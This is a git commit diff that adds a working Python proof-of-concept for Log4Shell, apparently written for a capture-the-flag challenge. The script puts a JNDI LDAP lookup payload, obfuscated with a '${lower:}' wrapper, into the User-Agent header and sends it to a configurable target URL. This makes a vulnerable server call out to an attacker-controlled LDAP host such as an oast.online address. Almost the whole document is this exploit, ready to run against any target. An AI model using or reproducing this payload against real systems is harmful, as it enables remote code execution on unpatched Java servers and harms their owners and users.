ed5181883bd97efe3c9be08e69c7b9beaf7b9108
Ruben Christoffer <rubenc@protonmail.com>
2022-03-03 15:27:37 +0100

    Python script for log4shell PoC is now working

--- Investigation/CustomScripts/log4shell.py
+++ Investigation/CustomScripts/log4shell.py
@@ -1,3 +1,27 @@
 #!/usr/bin/env python3
 
-print("Hello World")
+# Sends GET request to target and tries to exploit Log4Shell by including LDAP lookup in User-Agent HTTP header
+
+import requests
+import argparse
+
+parser = argparse.ArgumentParser()
+
+parser.add_argument('ldap_url', type=str, help="malicious ldap url (e.g. c8gctdu9lj4l2vnsu9ogceoc7qeyyyyyn.oast.online:389/dc=example)")
+parser.add_argument('--target', nargs='?', default="http://rsxc.no:20024", type=str, help="custom target url (e.g. http://example.com:8080)")
+
+args = parser.parse_args()
+
+headers = {
+    "Connection": "close",
+    "User-Agent": "${jndi:ldap://${lower:%s}}" % args.ldap_url.upper() # Using ${lower} to prevent false positives (e.g. by DNS lookups not caused by Log4Shell)
+}
+
+print(f"LDAP URL set to: ldap://{args.ldap_url}")
+print(f"Sending request to {args.target}")
+
+response = requests.get(args.target, headers = headers)
+print("---")
+print("Response:")
+print("")
+print(response.content)
